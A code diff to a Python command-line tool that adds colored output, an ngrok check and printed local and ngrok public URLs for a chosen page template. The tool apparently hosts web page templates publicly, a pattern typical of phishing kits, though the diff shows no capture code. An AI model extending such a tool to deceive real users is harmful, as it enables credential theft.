@@ -27,10 +27,14 @@ import sys
 from includes import banner
 from includes import utils
 from includes.menu import main_menu
+from includes import dynamic_url
+from includes import config_status
 from rich.console import Console
 from rich.panel import Panel
+import time
 
-
+from colorama import Fore, Style, init
+init(autoreset=True)
 
 console = Console()
 
@@ -47,9 +51,21 @@ def main():
             import os
             utils.kill_port(80)
             banner.show_banner()
+            config_status.check_ngrok()
             selected_template = utils.choose_template()
             if selected_template:
-                print(f"✅ Selected Template: {selected_template}")
+                print(Fore.GREEN + "✅ " + Style.BRIGHT + "Selected Template: " + Fore.CYAN + f"{selected_template}" + Style.RESET_ALL)
+                template_path = os.path.join("templates", selected_template)
+             
+                #url = dynamic_url.re_url()
+                local_ip = utils.getip()
+                ngrok_url = dynamic_url.re_url()
+                print()
+                print(f"{Fore.CYAN + Style.BRIGHT}[🌐 Localhost URL]{Style.RESET_ALL}   ➤  {Fore.YELLOW}http://{local_ip}/{selected_template}/")
+                print(f"{Fore.GREEN + Style.BRIGHT}[🚀 Ngrok Public URL]{Style.RESET_ALL} ➤  {Fore.MAGENTA}{ngrok_url}/{selected_template}/")
+                print()
+                input("Press Enter to go back to main menu...")
+                
                
             else:
                 print("🔙 Returning to main menu...")
